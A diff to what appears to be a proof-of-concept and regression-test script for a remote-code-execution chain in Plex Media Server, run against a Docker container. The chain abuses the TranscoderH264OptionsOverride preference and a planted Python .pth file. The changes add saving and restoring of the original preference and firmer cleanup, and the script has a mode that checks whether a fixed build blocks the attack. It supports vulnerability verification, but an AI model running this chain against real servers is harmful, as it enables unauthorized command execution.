@@ -7,6 +7,7 @@ import time
 import urllib.error
 import urllib.parse
 import urllib.request
+import xml.etree.ElementTree as ET
 
 
 PTH_DIRECTORY = "/config/.local/lib/python2.7/site-packages"
@@ -65,6 +66,17 @@ def docker_remove_generated(container, pth_path):
         )
 
 
+def read_preference(origin):
+    status, body = request(f"{origin}/:/prefs")
+    if status != 200:
+        raise RuntimeError(f"preference read returned HTTP {status}")
+    root = ET.fromstring(body)
+    for setting in root.iter():
+        if setting.attrib.get("id") == "TranscoderH264OptionsOverride":
+            return setting.attrib.get("value", "")
+    raise RuntimeError("TranscoderH264OptionsOverride was not returned")
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Plex Framework and transcoder-preference delayed RCE chain"
@@ -115,6 +127,7 @@ def main():
         if config_status != 200 or not docker_exists(args.container, PTH_DIRECTORY):
             raise RuntimeError("Framework request did not create the Python site directory")
 
+    original_preference = read_preference(origin)
     print("[2/4] Set TranscoderH264OptionsOverride")
     pref_status, _ = request(
         f"{origin}/:/prefs",
@@ -124,12 +137,8 @@ def main():
     print(f"Preference status: {pref_status}")
 
     if args.expect == "fixed":
-        request(
-            f"{origin}/:/prefs",
-            method="PUT",
-            params={"TranscoderH264OptionsOverride": ""},
-        )
-        if pref_status != 403 or docker_exists(args.container, pth_path):
+        if (pref_status != 403 or read_preference(origin) != original_preference or
+                docker_exists(args.container, pth_path)):
             raise RuntimeError("fixed behavior was not observed")
         print("PASS: fixed build rejected the protected preference")
         return
@@ -183,9 +192,9 @@ def main():
         reset_status, _ = request(
             f"{origin}/:/prefs",
             method="PUT",
-            params={"TranscoderH264OptionsOverride": ""},
+            params={"TranscoderH264OptionsOverride": original_preference},
         )
-        if reset_status != 200:
+        if reset_status != 200 or read_preference(origin) != original_preference:
             raise RuntimeError(
                 f"payload was placed but preference reset returned HTTP {reset_status}"
             )
@@ -203,24 +212,27 @@ def main():
         else:
             raise RuntimeError("command execution was not verified")
     finally:
-        if not preference_reset:
-            try:
+        try:
+            if not preference_reset:
                 retry_status, _ = request(
                     f"{origin}/:/prefs",
                     method="PUT",
-                    params={"TranscoderH264OptionsOverride": ""},
+                    params={"TranscoderH264OptionsOverride": original_preference},
                     timeout=3,
                 )
-                if retry_status != 200:
+                if (retry_status != 200 or
+                        read_preference(origin) != original_preference):
                     print(
                         f"warning: preference reset returned HTTP {retry_status}",
                         file=sys.stderr,
                     )
-            except OSError:
+        except (OSError, RuntimeError, ET.ParseError):
+            if not preference_reset:
                 print("warning: preference reset request failed", file=sys.stderr)
-        if placed and not args.keep_payload:
-            docker_remove_generated(args.container, pth_path)
-            print(f"Removed generated artifacts for run {stamp}")
+        finally:
+            if placed and not args.keep_payload:
+                docker_remove_generated(args.container, pth_path)
+                print(f"Removed generated artifacts for run {stamp}")
 
     print(f"PASS: {args.verify_path} was created by the supplied command")
 
@@ -228,6 +240,6 @@ def main():
 if __name__ == "__main__":
     try:
         main()
-    except (OSError, RuntimeError, subprocess.SubprocessError) as exc:
+    except (OSError, RuntimeError, subprocess.SubprocessError, ET.ParseError) as exc:
         print(f"error: {exc}", file=sys.stderr)
         raise SystemExit(1)
